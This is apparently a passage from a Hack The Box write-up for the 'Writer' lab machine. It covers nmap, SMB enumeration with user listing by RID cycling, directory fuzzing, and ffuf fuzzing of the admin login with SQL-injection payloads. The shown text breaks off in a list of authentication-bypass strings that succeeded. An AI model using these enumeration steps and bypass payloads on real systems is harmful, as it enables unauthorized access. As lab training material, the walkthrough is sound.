# Enumeration
## Nmap
```bash
# Nmap 7.91 scan initiated Sun Aug  1 01:58:59 2021 as: nmap -vvv -p 22,80,139,445 -A -v -oN intial.nmap 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up, received syn-ack (0.13s latency).
Scanned at 2021-08-01 01:59:01 EDT for 17s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAA7IblnSMXNfqjkkoT+PAk2SPYBRL5gy0K0FQ2XbFGuPk6ImjJLrb0BF6qw3hU/I2V9ARRnn2SvHlz1+lLB0Ie9wkvH1gZfnUBd5X2sOS3vCzYJOBoD+yzJat40YmKx3NLjYCzkMd/KyTGGIH0cdlnROO6eJdnJN1QYMsrM4+QkkrQHtgz5KAk/aE18+1e5toWK1Px+KtVjvPWiD7mTb4J99f79L/5CCI9nUfmjeB8EU9qe3igUQ3zCGVFGUNTA9Vva99kh3SC6YjBe8+9ipFSZFVSqaJoJpZF83Oy2BEPWEb6lgo3cx7FwGH24nT833Y4Urk294/5ym8F3JFxo/FCgtjuYwp5Im1j9oVOGSnECKfC785zZiSu+ubdnxDjvbuRgW34DsKZpbtVvwxs8R/VNE3bSldVLmz5gCwP0Dfaop+Tbn7MW8OJWL6hEQqNiLw3cSBpzPId/EIMO7TMfqVXTfkMtD1yiIlafd3ianGLu+VUpJ3Bg8jk/COUOHj/M=
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+ZKRtm6JRYjPO1v8n2nR/cGDBj0Oaydm1VE6rUnvyI6bxfnPCaRjvxDrV3eW5rRXbK/ybC0k5WHtQ9iWogmAU=
|   256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaCZ4ALrn0m103XaA+e+YPrTO2f1hK8mAD5kUxJ7O9L
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5s
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WRITER<00>           Flags: <unique><active>
|   WRITER<03>           Flags: <unique><active>
|   WRITER<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52234/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36309/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34246/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42160/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-01T05:59:20
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 01:59:18 2021 -- 1 IP address (1 host up) scanned in 19.34 seconds
```
Looks like we have SSH,SMB and WEB. So let's start with SMB
## SMB
### Enum4linux
```bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug  1 02:04:47 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.11.101
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.11.101    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.11.101    |
 ============================================ 
Looking up status of 10.10.11.101
	WRITER          <00> -         B <ACTIVE>  Workstation Service
	WRITER          <03> -         B <ACTIVE>  Messenger Service
	WRITER          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.11.101    |
 ===================================== 
[+] Server 10.10.11.101 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.11.101    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.11.101    |
 ====================================== 
[+] Got OS info for 10.10.11.101 from smbclient: 
[+] Got OS info for 10.10.11.101 from srvinfo:
	WRITER         Wk Sv PrQ Unx NT SNT writer server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.11.101    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle	Name: Kyle Travis	Desc: 

user:[kyle] rid:[0x3e8]

 ========================================= 
|    Share Enumeration on 10.10.11.101    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	writer2_project Disk      
	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.11.101
//10.10.11.101/print$	Mapping: DENIED, Listing: N/A
//10.10.11.101/writer2_project	Mapping: DENIED, Listing: N/A
//10.10.11.101/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.11.101    |
 ==================================================== 


[+] Attaching to 10.10.11.101 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] WRITER
	[+] Builtin

[+] Password Info for Domain: WRITER

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.11.101    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.11.101 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1663171886-1921258872-720408159 and logon username '', password ''
S-1-5-21-1663171886-1921258872-720408159-500 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-501 WRITER\nobody (Local User)
S-1-5-21-1663171886-1921258872-720408159-502 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-503 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-504 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-505 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-506 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-507 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-508 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-509 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-510 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-511 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-512 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-513 WRITER\None (Domain Group)
S-1-5-21-1663171886-1921258872-720408159-514 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-515 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-516 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-517 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-518 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-519 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-520 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-521 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-522 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-523 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-524 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-525 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-526 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-527 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-528 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-529 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-530 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-531 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-532 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-533 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-534 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-535 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-536 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-537 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-538 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-539 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-540 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-541 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-542 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-543 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-544 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-545 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-546 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-547 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-548 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-549 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-550 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)
S-1-5-21-1663171886-1921258872-720408159-1001 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1002 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1003 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1004 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1005 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1006 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1007 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1008 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1009 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1010 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1011 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1012 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1013 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1014 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1015 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1016 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1017 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1018 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1019 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1020 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1021 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1022 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1023 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1024 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1025 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1026 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1027 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1028 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1029 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1030 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1031 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1032 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1033 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1034 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1035 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1036 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1037 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1038 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1039 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1040 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1041 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1042 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1043 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1044 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1045 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1046 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1047 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1048 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1049 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kyle (Local User)
S-1-22-1-1001 Unix User\john (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 ============================================= 
|    Getting printer info for 10.10.11.101    |
 ============================================= 
No printers returned.


enum4linux complete on Sun Aug  1 02:15:46 2021
```
We have tons of information.
Especially the username using RID Cycling So let's create a user.txt
```bash
kali@kali:~/HackTheBox/Writer$ cat user.txt 
kyle
john
nobody
```
### smbmap
```bash
kali@kali:~/HackTheBox/Writer$ smbmap -u '' -p '' -R -H 10.10.11.101
[+] IP: 10.10.11.101:445        Name: 10.10.11.101                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
```
Looks like annoymous login is no good as we can read any shares.
## WEB
### Visiting Website
Visiting the website it looks like a normal blog website
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801113853.png)
At the Bottom you can see a refference to writer.htb so let's add it in /etc/hosts probably this is not required but it's better to be safe.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801114253.png)
### Directory Fuzzing
```bash
kali@kali:~/HackTheBox/Writer$ ffuf -u http://10.10.11.101/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

about                   [Status: 200, Size: 3522, Words: 250, Lines: 75]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
contact                 [Status: 200, Size: 4899, Words: 242, Lines: 110]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
static                  [Status: 301, Size: 313, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 790 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```
Looks like we have few intresting directories.
let's first visit administrative.
### Crawling through the directories

Looks like a normal login page.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801114446.png)
/dashboard redirects to the homepage and /about has nothing intresting.
/contact has the form looks like a dead form which requests with the get request but give 404 response.
So the only good enpoint is the /administrative
we have the user so we can spray the password but before that let's see if it has any sql injections.
### Sql-Injection
so I tried doing some basic sqlinjection payload at the login form.
```bash
kali@kali:~/HackTheBox/Writer$ cat r.txt 
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=UNAME&password=PASS
```
The above request is captured by the burpsuite and UNAME and PASS are the names of the values to be fuzzed.
```bash
kali@kali:~/HackTheBox/Writer$ ffuf -X POST -request r.txt -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt:UNAME -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass
.txt:PASS  -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________
 :: Method           : POST
 :: URL              : http://writer.htb/administrative
 :: Wordlist         : UNAME: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt
 :: Wordlist         : PASS: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://writer.htb/administrative
 :: Header           : Host: writer.htb
 :: Header           : Origin: http://writer.htb
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : uname=UNAME&password=PASS

 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 790
________________________________________________


[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'or 1=1 or ''='

[2K    * UNAME: 'or 1=1 or ''='

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin' or 1=1#

[2K    * PASS: admin' or 1=1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin' #

[2K    * PASS: admin' #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 0=0 #

[2K    * PASS: ' or 0=0 #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin' or '1'='1'#

[2K    * UNAME: admin' or '1'='1'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1;#

[2K    * PASS: ' or 1=1;#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or         0=0 #

[2K    * PASS: ' or         0=0 #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1 LIMIT 1;#

[2K    * PASS: ' or 1=1 LIMIT 1;#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: ' or '1'='1'#

[2K    * UNAME: ' or '1'='1'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' OR 'x'='x'#;

[2K    * PASS: ' OR 'x'='x'#;

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin' or '1'='1

[2K    * UNAME: admin' or '1'='1

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin'or 1=1 or ''='

[2K    * PASS: admin'or 1=1 or ''='

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1#

[2K    * PASS: ' or 1=1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=' 'or' and '=' 'or'

[2K    * PASS: '=' 'or' and '=' 'or'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '-''-- 2

[2K    * PASS: '-''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=''#

[2K    * PASS: '=''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '-''#

[2K    * UNAME: '-''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 0'<'2'-- 2

[2K    * PASS: 0'<'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 0'<'2'#

